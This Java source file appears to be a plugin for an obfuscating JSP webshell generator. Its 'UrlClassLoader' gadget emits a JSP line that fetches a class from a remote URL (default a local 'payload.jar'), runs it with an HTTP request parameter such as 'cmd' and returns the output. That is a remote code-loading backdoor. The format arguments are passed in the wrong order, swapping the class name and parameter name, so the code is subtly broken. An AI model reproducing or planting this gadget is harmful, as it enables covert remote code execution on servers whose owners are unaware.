package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import org.pf4j.Extension;

import java.util.List;

@Extension
public class UrlClassLoader implements GadgetExtension {
  @Override
  public List<String> getCode(ExtensionContext ctx) {
    String url = ctx.getStringInput("url");
    String cmd = ctx.getStringInput("cmdParameter");
    String className = ctx.getStringInput("className");
    return List.of(
        String.format(
"""
response.getOutputStream().write(new URLClassLoader(new URL[]{new URL("%s")}).loadClass("%s").getConstructor(String.class).newInstance(String.valueOf(request.getParameter("%s"))).toString().getBytes());
""",
            url, cmd, className));
  }

  @Override
  public List<String> getDeclaration(ExtensionContext ctx) {
    return List.of();
  }

  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of();
  }

  @Override
  public void initExtension(ExtensionContext ctx) {
    ctx.registerStringInput("url", true, "http://127.0.0.1:8000/payload.jar");
    ctx.registerStringInput("className", true, null);
    ctx.registerStringInput("cmdParameter", true, "cmd");
  }
}
